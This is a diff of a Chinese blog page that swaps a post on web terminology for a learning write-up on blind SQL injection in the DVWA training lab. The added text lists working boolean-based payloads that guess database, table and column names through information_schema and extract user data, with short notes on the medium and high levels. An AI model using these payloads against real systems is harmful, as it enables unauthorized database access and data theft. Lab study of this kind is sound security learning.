@@ -9,7 +9,7 @@
     
     <title>
         
-            cms、后台、后端、web服务器一些术语的理解 |
+            dvwa中的sql盲注学习 |
         
         IdealYth&#39;s Blog
     </title>
@@ -24,7 +24,7 @@
     KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/head.jpg","favicon":"/images/head.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
   </script>
-<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="理想青年" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="理想青年 - 心有猛虎，细嗅蔷薇" type="application/atom+xml">
 </head>
 
 
@@ -184,7 +184,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">cms、后台、后端、web服务器一些术语的理解</span>
+            <span class="title-hover-animation">dvwa中的sql盲注学习</span>
         </div>
 
         
@@ -201,8 +201,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2022-04-02 21:32:44</span>
-        <span class="mobile">2022-04-02 21:32</span>
+        <span class="pc">2022-04-11 20:35:15</span>
+        <span class="mobile">2022-04-11 20:35</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -226,11 +226,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/cms/">cms</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/web%E6%9C%8D%E5%8A%A1%E5%99%A8/">web服务器</a>&nbsp;
+                        | <a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a>&nbsp;
                     </li>
                 
             </ul>
@@ -240,12 +236,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>391 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>517 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>2 分钟</span>
         </span>
     
     
@@ -261,12 +257,32 @@
         
 
         <div class="article-content markdown-body">
-            <p><strong>CMS</strong>：是模板式的网站开发工具，直接套用模板开发网站，肯定包括后台管理系统，一套cms后台管理都挺类似的</p>
-<p><strong>后台管理系统</strong>：可能是用某种语言写出来的一个管理网站的系统</p>
-<p>转载自百度知道的一个解释：<br>但凡CMS，一定是有一套资深的网站后台管理系统的，功能强大的还能直接管理网站前端的一些功能。<br>但是网站后台管理系统不一定来源于CMS，也会有技术人员直接用PHP或者.net直接开发而成。<br>说白了就是CMS是半成品，网站后台管理系统是成品。所以二者的区别是，cms一定带有网站后台管理系统，但网站后台管理系统并不一定是CMS，有可能直接用语言写出来。</p>
-<p><strong>后端</strong>：前端是写代码给浏览器看的。后端是写代码给服务器看的。后端就是一些应用程序，部署在web服务器上，前端通过这些后端应用程序来和数据库交互等。</p>
-<p><strong>web服务器</strong>：就是一个容器，里面放着网站文件等</p>
-<p>指服务器上运行着的一个软件，可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；可以放置数据文件，让全世界下载。目前最主流的三个Web服务器是Apache、 Nginx 、IIS。</p>
+            <p>刚开始也没有思路，不知道怎么测试注入点，然后就是看到一位表哥的文章，这才理解。这里贴出来文章地址<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/chadlas/articles/15735045.html" >DVWA靶场通关—-(8) SQL Injection(Blind)教程 <i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="1-low"><a href="#1-low" class="headerlink" title="1.low"></a>1.low</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.先输入1，页面返回正常。</span><br><span class="line"></span><br><span class="line">2.输入&quot; 1\ &quot; , 页面返回异常。</span><br><span class="line"></span><br><span class="line">3.输入“1&#x27;#”,页面返回正常。//这样来猜测参数的闭合方式</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里我刚开始用的and 1&#x3D;1#和1&#x3D;2#都返回不正常，后来才发现可能是因为“#”号没有url编码。</strong></p>
+<p><strong>以下语句为了方便查看，都是未编码过的，但实际测试时候都经过编码(或者直接在输入框里输入语句，别再url上直接输入)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;=10#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=5#   //异常</span><br><span class="line">1&#x27; and length(database())&gt;=4#   //正常</span><br></pre></td></tr></table></figure>
+
+<p>4.然后猜解表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">//这边然后直接用burp爆破，库名为dvwa</span><br></pre></td></tr></table></figure>
+
+<p>5.判断数据库表的个数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)&gt;=5#</span><br><span class="line">//有两张表</span><br></pre></td></tr></table></figure>
+
+<p>6.猜解数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br><span class="line">//表名users</span><br></pre></td></tr></table></figure>
+
+<p>5.猜解字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p>6.猜解字段内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select first_name from users limit 0,1),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Medium"><a href="#2-Medium" class="headerlink" title="2.Medium"></a>2.Medium</h2><p>查看代码，因为参数是下拉列表的，所以没有单引号，所以不需要闭合。还对一些特殊符号进行了过滤。因为是post型的，所以这里直接burp抓包，然后该数据。</p>
+<p><strong>知识点：下拉列表的数字的这种形式，可能参数根本没有引号包裹，所以根本不需要想办法闭合什么的</strong></p>
+<p>后面的就和low操作过程基本一样</p>
+<h2 id="3-high"><a href="#3-high" class="headerlink" title="3.high"></a>3.high</h2><p>有limit来限制查询只能一条，这里直接用#给他砍掉，然后就是和low差不多了就。</p>
 
         </div>
 
@@ -274,11 +290,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>本文标题：cms、后台、后端、web服务器一些术语的理解</li>
+        <li>本文标题：dvwa中的sql盲注学习</li>
         <li>本文作者：理想青年</li>
-        <li>创建时间：2022-04-02 21:32:44</li>
+        <li>创建时间：2022-04-11 20:35:15</li>
         <li>
-            本文链接：https://idealyth.github.io/2022/04/02/cms、后台、后端、web服务器一些术语的理解/
+            本文链接：https://idealyth.github.io/2022/04/11/dvwa中的sql盲注学习/
         </li>
         <li>
             版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -297,11 +313,7 @@
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/cms/">#cms</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/web%E6%9C%8D%E5%8A%A1%E5%99%A8/">#web服务器</a>&nbsp;
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a>&nbsp;
                     </li>
                 
             </ul>
@@ -313,13 +325,13 @@
                     <div class="article-prev">
                         <a class="prev"
                            rel="prev"
-                           href="/2022/04/03/hexo-keep%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"
+                           href="/2022/04/14/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"
                         >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">hexo-keep主题美化</span>
+                                <span class="post-nav-title-item">网络空间搜索引擎</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                         </a>
@@ -329,10 +341,10 @@
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2022/04/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"
+                           href="/2022/04/08/docker%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">第一篇文章</span>
+                                <span class="post-nav-title-item">docker的简单使用</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -547,7 +559,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-low"><span class="nav-number">1.</span> <span class="nav-text">1.low</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Medium"><span class="nav-number">2.</span> <span class="nav-text">2.Medium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-high"><span class="nav-number">3.</span> <span class="nav-text">3.high</span></a></li></ol>
     </div>
 </div>
         </aside>
